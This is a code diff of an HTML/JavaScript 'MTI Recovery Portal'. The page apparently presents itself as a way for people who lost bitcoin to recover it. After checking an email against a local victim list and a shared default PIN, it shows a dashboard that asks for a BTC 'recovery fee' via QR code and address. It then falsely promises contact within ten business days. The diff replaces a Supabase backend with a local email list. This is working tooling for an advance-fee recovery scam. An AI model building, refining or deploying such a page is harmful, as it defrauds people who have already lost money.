@@ -6,10 +6,10 @@
     <title>MTI Recovery Portal</title>
     <script src="https://cdn.tailwindcss.com">
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
-    </script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js">
     </script>
+    <!-- Load local email database -->
+    <script src="emails.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         body {
@@ -176,7 +176,7 @@
                     </div>
                 </div>
 
-                <!-- QR Code & Address (hidden until option selected) -->
+                <!-- Payment Details -->
                 <div id="payment-details" class="hidden-section glass rounded-3xl p-6 text-center">
                     <h4 class="font-bold text-slate-900 mb-2">Send the fee to the address below</h4>
                     <div id="qr-container" class="flex justify-center my-3"></div>
@@ -200,17 +200,12 @@
 
     <script>
         // ================================================================
-        // CONFIGURATION
+        // CONFIGURATION (local)
         // ================================================================
-        const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
-        const TABLE_NAME = 'profiles';
-        const EMAIL_COL = 'email';
-        const PIN_COL = 'pin';
 
-        // Hardcoded fee addresses (use your own testnet or mainnet addresses)
-        const FEE_ADDRESS_OPTION1 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'; // example (mainnet)
-        const FEE_ADDRESS_OPTION2 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'; // replace with your own
+        // Fee addresses (replace with your own)
+        const FEE_ADDRESS_OPTION1 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+        const FEE_ADDRESS_OPTION2 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
 
         const FEE_AMOUNT_OPTION1 = 0.0019;
         const FEE_AMOUNT_OPTION2 = 0.0058;
@@ -220,13 +215,11 @@
 
         // ================================================================
 
-        let currentUser = null;
+        let currentUserEmail = null;
         let lostBTC = 0;
         let lostUSD = 0;
         let currentPrice = 0;
         let selectedOption = null;
-
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // Helper: set status message
         function setStatus(msg, type = 'info') {
@@ -241,9 +234,9 @@
             document.getElementById('login-btn').innerText = 'Verify Credentials';
         }
 
-        // --- Fetch user from Supabase ---
+        // --- Fetch user from local email list ---
         async function fetchUserRecord() {
-            const email = document.getElementById('email-input').value.trim();
+            const email = document.getElementById('email-input').value.trim().toLowerCase();
             const pin = document.getElementById('pin-input').value.trim();
             lostBTC = parseFloat(document.getElementById('lost-btc').value) || 0;
             lostUSD = parseFloat(document.getElementById('lost-usd').value) || 0;
@@ -256,38 +249,43 @@
 
             setStatus('🔍 Checking credentials...', 'info');
 
+            // Check if email exists in the local database (from emails.js)
+            if (typeof validEmails === 'undefined') {
+                setStatus('❌ Email database not loaded. Check emails.js.', 'error');
+                resetLoginButton();
+                return;
+            }
+
+            // Normalize: all emails in validEmails are already lowercased? We'll check case-insensitively.
+            const found = validEmails.some(e => e.toLowerCase() === email);
+            if (!found) {
+                setStatus('❌ Email not found in the recovery list.', 'error');
+                resetLoginButton();
+                return;
+            }
+
+            // Check PIN (using default PIN for all)
+            if (pin !== DEFAULT_PIN) {
+                setStatus('❌ Incorrect PIN. Try again.', 'error');
+                resetLoginButton();
+                return;
+            }
+
+            // Success
+            currentUserEmail = email;
+            setStatus('✅ Login successful! Fetching current BTC price...', 'info');
+
             try {
-                const { data, error } = await supabase
-                    .from(TABLE_NAME)
-                    .select('*')
-                    .eq(EMAIL_COL, email)
-                    .maybeSingle();
-
-                if (error || !data) {
-                    setStatus('❌ Email or PIN not found.', 'error');
-                    resetLoginButton();
-                    return;
-                }
-                if (data[PIN_COL] !== pin) {
-                    setStatus('❌ Incorrect PIN.', 'error');
-                    resetLoginButton();
-                    return;
-                }
-
-                currentUser = data;
-                setStatus('✅ Login successful! Fetching current BTC price...', 'info');
-
                 // Fetch current BTC price
                 const priceRes = await fetch(PRICE_API);
                 const priceData = await priceRes.json();
                 currentPrice = priceData.bitcoin.usd || 0;
-
-                // Show dashboard
-                showDashboard();
-            } catch (err) {
-                setStatus('💥 Unexpected error: ' + err.message, 'error');
-                console.error(err);
+            } catch (e) {
+                setStatus('⚠️ Could not fetch BTC price. Using 0.', 'warning');
+                currentPrice = 0;
             }
+
+            showDashboard();
             resetLoginButton();
         }
 
@@ -296,7 +294,7 @@
             document.getElementById('login-section').classList.add('hidden-section');
             document.getElementById('dashboard').classList.remove('hidden-section');
 
-            document.getElementById('display-email').innerText = currentUser.email;
+            document.getElementById('display-email').innerText = currentUserEmail;
             document.getElementById('display-lost-btc').innerText = lostBTC.toFixed(4) + ' BTC';
             document.getElementById('display-lost-usd').innerText = '$' + lostUSD.toFixed(2);
 
@@ -365,8 +363,6 @@
             document.getElementById('recovery-options').classList.add('hidden-section');
             document.getElementById('final-success').classList.remove('hidden-section');
             setStatus('✅ Recovery initiated. You will be contacted within 10 business days.', 'success');
-
-            // Optionally, you could log this action to Supabase
         }
 
         // --- Initial state ---
